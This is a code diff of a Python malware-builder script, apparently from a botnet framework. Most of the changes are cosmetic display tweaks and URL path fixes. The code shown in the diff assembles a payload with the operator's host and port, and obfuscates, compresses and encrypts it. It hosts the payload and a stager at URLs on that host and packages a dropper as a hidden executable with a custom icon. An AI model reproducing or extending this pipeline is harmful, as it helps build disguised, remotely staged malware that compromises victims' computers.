@@ -183,17 +183,15 @@ def main():
 
 def _update(input, output, task=None):
     diff = round(float(100.0 * float(float(len(output))/float(len(input)) - 1.0)))
-    util.display("[+]", color='green', style='bright', end=',')
-    util.display(" ".join([task if task else "", "Complete" if len(str(task).split()) <= 1 else ""]), color='reset', style='bright', end=',')
-    util.display("({:,} bytes {} to {:,} bytes ({}% {})".format(len(input), 'increased' if len(output) > len(input) else 'reduced', len(output), diff, 'larger' if len(output) > len(input) else 'smaller').ljust(80 - len("[+] ")), style='dim', color='reset')
+    util.display("({:,} bytes {} to {:,} bytes ({}% {})".format(len(input), 'increased' if len(output) > len(input) else 'reduced', len(output), diff, 'larger' if len(output) > len(input) else 'smaller').ljust(80), style='dim', color='reset')
 
 def _modules(options, **kwargs):
-    util.display("\n[>]", color='yellow', style='bright', end=',')
+    util.display("\n[>]", color='green', style='bright', end=',')
     util.display('Modules', color='reset', style='bright')
-    util.display("        Adding modules...", color='reset', style='dim', end=',')
+    util.display("        Adding modules...", color='reset', style='normal', end=',')
     __load__ = threading.Event()
     __spin__ = util.spinner(__load__)
-    modules = ['core/remoteimport.py','core/util.py','core/security.py','core/payload.py']
+    modules = ['core/loader.py','core/util.py','core/security.py','core/payload.py']
 
     if len(options.modules):
         for m in options.modules:
@@ -202,23 +200,21 @@ def _modules(options, **kwargs):
                 if not os.path.exists(m):
                     _m = os.path.join(os.path.abspath('modules'), os.path.basename(m))
                     if _m not in [os.path.splitext(_)[0] for _ in os.listdir('modules')]:
-                        util.display("[-]", color='red', style='dim')
-                        util.display("can't add module: '{}' (does not exist)".format(m), color='reset', style='dim')
+                        util.display("[-]", color='red', style='normal')
+                        util.display("can't add module: '{}' (does not exist)".format(m), color='reset', style='normal')
                         continue
                 module = os.path.join(os.path.abspath('modules'), m if '.py' in os.path.splitext(m)[1] else '.'.join([os.path.splitext(m)[0], '.py']))
                 modules.append(module)
 
     __load__.set()
-    util.display("[+]", color='green', style='bright', end=',')
-    util.display("Modules Complete", color='reset', style='bright', end=',')
     util.display("({} modules added to client)".format(len(modules)), color='reset', style='dim')
     return modules
 
 def _imports(options, **kwargs):
-    util.display("\n[>]", color='yellow', style='bright', end=',')
+    util.display("\n[>]", color='green', style='bright', end=',')
     util.display("Imports", color='reset', style='bright')
     assert 'modules' in kwargs, "missing keyword argument 'modules'"
-    util.display("        Adding imports...", color='reset', style='dim', end=',')
+    util.display("        Adding imports...", color='reset', style='normal', end=',')
     globals()['__load__'] = threading.Event()
     globals()['__spin__'] = util.spinner(__load__)
     imports  = set()
@@ -258,22 +254,25 @@ def _hidden(options, **kwargs):
                 hidden.add(i)
 
     globals()['__load__'].set()
-    util.display("[+]", color='green', style='bright', end=',')
-    util.display("Imports Complete", color='reset', style='bright', end=',')
     util.display("({} imports from {} modules)".format(len(list(hidden)), len(kwargs['modules'])), color='reset', style='dim')
     return list(hidden)
 
 def _payload(options, **kwargs):
-    util.display("\n[>]", color='yellow', style='bright', end=',')
-    util.display("Payload", color='reset', style='dim')
+    util.display("\n[>]", color='green', style='bright', end=',')
+    util.display("Payload", color='reset', style='bright')
     assert 'var' in kwargs, "missing keyword argument 'var'"
     assert 'modules' in kwargs, "missing keyword argument 'modules'"
     assert 'imports' in kwargs, "missing keyword argument 'imports'"
     payload = '\n'.join(list(kwargs['imports']) + [open(module,'r').read().partition('# main')[2] for module in kwargs['modules']]) + generators.snippet('main', 'Payload', **{"host": options.host, "port": options.port, "pastebin": options.pastebin if options.pastebin else str()}) + '_payload.run()'
+    if not os.path.exists('modules/payloads'):
+        try:
+            os.mkdir('modules/payloads')
+        except OSError:
+            __logger__.debug("Permission denied: unabled to make directory './modules/payloads/'")
 
     if options.obfuscate:
         __load__= threading.Event()
-        util.display("        Obfuscating payload...", color='reset', style='dim', end=',')
+        util.display("        Obfuscating payload...", color='reset', style='normal', end=',')
         __spin__= util.spinner(__load__)
         output = '\n'.join([line for line in generators.obfuscate(payload).rstrip().splitlines() if '=jobs' not in line])
         __load__.set()
@@ -281,7 +280,7 @@ def _payload(options, **kwargs):
         payload = output
 
     if options.compress:
-        util.display("        Compressing payload... ", color='reset', style='dim', end=',')
+        util.display("        Compressing payload... ", color='reset', style='normal', end=',')
         __load__ = threading.Event()
         __spin__ = util.spinner(__load__)
         output = generators.compress(payload)
@@ -291,7 +290,7 @@ def _payload(options, **kwargs):
 
     if options.encrypt:
         assert 'key' in kwargs, "missing keyword argument 'key' required for option 'encrypt'"
-        util.display("        Encrypting payload... ".format(kwargs['key']), color='reset', style='dim', end=',')
+        util.display("        Encrypting payload... ".format(kwargs['key']), color='reset', style='normal', end=',')
         __load__ = threading.Event()
         __spin__ = util.spinner(__load__)
         output = generators.encrypt(payload, kwargs['key'])
@@ -299,7 +298,7 @@ def _payload(options, **kwargs):
         _update(payload, output, task='Encryption')
         payload = output
 
-    util.display("        Uploading payload... ", color='reset', style='dim', end=',')
+    util.display("        Uploading payload... ", color='reset', style='normal', end=',')
     __load__ = threading.Event()
     __spin__ = util.spinner(__load__)
 
@@ -315,27 +314,28 @@ def _payload(options, **kwargs):
         path = os.path.join(os.path.abspath(dirname), kwargs['var'] + '.py' )
         with file(path, 'w') as fp:
             fp.write(payload)
-        s = 'http://{}:{}/{}'.format(options.host, options.port, urllib.pathname2url(path.strip(os.path.join(os.getcwd(), 'modules'))))
+        s = 'http://{}:{}/{}'.format(options.host, options.port, urllib.pathname2url(path.replace(os.path.join(os.getcwd(), 'modules'), '')))
         s = urllib2.urlparse.urlsplit(s)
-        url = urllib2.urlparse.urlunsplit((s.scheme, s.netloc, os.path.normpath(s.path), s.query, s.fragment)).replace('\\','/').replace('//payloads','/payloads')
-        if url.endswith('.p'):
-            url += 'y'
+        url = urllib2.urlparse.urlunsplit((s.scheme, s.netloc, os.path.normpath(s.path), s.query, s.fragment)).replace('\\','/')
     __load__.set()
-    util.display("[+]", color='green', style='bright', end=',')
-    util.display("Upload Complete", color='reset', style='bright', end=',')
     util.display("(hosting payload at: {})".format(url), color='reset', style='dim')
     return url
 
 def _stager(options, **kwargs):
-    util.display("\n[>]", color='yellow', style='bright', end=',')
-    util.display("Stager", color='reset', style='dim')
+    util.display("\n[>]", color='green', style='bright', end=',')
+    util.display("Stager", color='reset', style='bright')
     assert 'url' in kwargs, "missing keyword argument 'url'"
     assert 'key' in kwargs, "missing keyword argument 'key'"
     assert 'var' in kwargs, "missing keyword argument 'var'"
     stager = open('core/stager.py', 'r').read() + generators.snippet('main', 'run', url=kwargs['url'], key=kwargs['key'])
+    if not os.path.exists('modules/stagers'):
+        try:
+            os.mkdir('modules/stagers')
+        except OSError:
+            __logger__.debug("Permission denied: unable to make directory './modules/stagers/'")
 
     if options.obfuscate:
-        util.display("        Obfuscating stager... ", color='reset', style='dim', end=',')
+        util.display("        Obfuscating stager... ", color='reset', style='normal', end=',')
         __load__ = threading.Event()
         __spin__ = util.spinner(__load__)
         output = generators.obfuscate(stager)
@@ -344,14 +344,14 @@ def _stager(options, **kwargs):
         stager = output
 
     if options.compress:
-        util.display("        Compressing stager... ", color='reset', style='dim', end=',')
+        util.display("        Compressing stager... ", color='reset', style='normal', end=',')
         __load__ = threading.Event()
         __spin__ = util.spinner(__load__)
         output  = base64.b64encode(zlib.compress(marshal.dumps(compile(stager, '', 'exec')), 9))
         __load__.set()
         _update(stager, output, task='Compression')
         stager = output
-    util.display("        Uploading stager... ", color='reset', style='dim', end=',')
+    util.display("        Uploading stager... ", color='reset', style='normal', end=',')
     __load__ = threading.Event()
     __spin__ = util.spinner(__load__)
 
@@ -364,22 +364,18 @@ def _stager(options, **kwargs):
         for d in dirs:
             if os.path.isdir(d):
                 dirname = d
-        path2 = os.path.join(os.path.abspath(dirname), kwargs['var'] + '.py' )
-        with file(path2, 'w') as fp:
+        path = os.path.join(os.path.abspath(dirname), kwargs['var'] + '.py' )
+        with file(path, 'w') as fp:
             fp.write(stager)
-        s = 'http://{}:{}/{}'.format(options.host, int(options.port) + 1, urllib.pathname2url(path2.strip(os.path.join(os.getcwd(), 'modules'))))
+        s = 'http://{}:{}/{}'.format(options.host, int(options.port) + 1, urllib.pathname2url(path.replace(os.path.join(os.getcwd(), 'modules'), '')))
         s = urllib2.urlparse.urlsplit(s)
-        url = urllib2.urlparse.urlunsplit((s.scheme, s.netloc, os.path.normpath(s.path), s.query, s.fragment)).replace('\\','/').replace('//tagers','/stagers')
-        if url.endswith('.p'):
-            url += 'y'
+        url = urllib2.urlparse.urlunsplit((s.scheme, s.netloc, os.path.normpath(s.path), s.query, s.fragment)).replace('\\','/')
     __load__.set()
-    util.display("[+]", color='green', style='bright', end=',')
-    util.display("Upload Complete", color='reset', style='bright', end=',')
     util.display("(hosting stager at: {})".format(url), color='reset', style='dim')
     return url
 
 def _dropper(options, **kwargs):
-    util.display("\n[>]", color='yellow', style='bright', end=',')
+    util.display("\n[>]", color='green', style='bright', end=',')
     util.display("Dropper", color='reset', style='bright')
     assert 'url' in kwargs, "missing keyword argument 'url'"
     assert 'var' in kwargs, "missing keyword argument 'var'"
@@ -392,27 +388,20 @@ def _dropper(options, **kwargs):
         fp.write(dropper)
 
     if options.exe:
-        util.display('    Compiling executable...', color='reset', style='dim', end=',')
+        util.display('    Compiling executable...', color='reset', style='normal', end=',')
         __load__ = threading.Event()
         __spin__ = util.spinner(__load__)
         name = generators.exe(name, icon=options.icon, hidden=kwargs['hidden'])
         __load__.set()
-        util.display("[+]", color='green', style='bright', end=',')
-        util.display("Executable Complete", color='reset', style='bright')
 
     elif options.app:
-        util.display('    Bundling application...', color='reset', style='dim', end=',')
+        util.display('    Bundling application...', color='reset', style='normal', end=',')
         __load__ = threading.Event()
         __spin__ = util.spinner(__load__)
-        name = generators.app(name, icon=options.icon)
+        name = generators.exe(name, icon=options.icon, hidden=kwargs['hidden'])
         __load__.set()
-        util.display("[+]", color='green', style='bright', end=',')
-        util.display("Application Complete", color='reset', style='bright')
 
-    util.display("        Saving dropper...", color='reset', style='dim', end=',')
-    util.display("[+]", color='green', style='bright', end=',')
-    util.display("Dropper Complete", color='reset', style='bright', end=',')
-    util.display("(saved to file: {})".format(name).ljust(80 - len("[+]")), style='dim', color='reset')
+    util.display('(saved to file: {})\n'.format(name), style='dim', color='reset')
     return name
 
 if __name__ == '__main__':
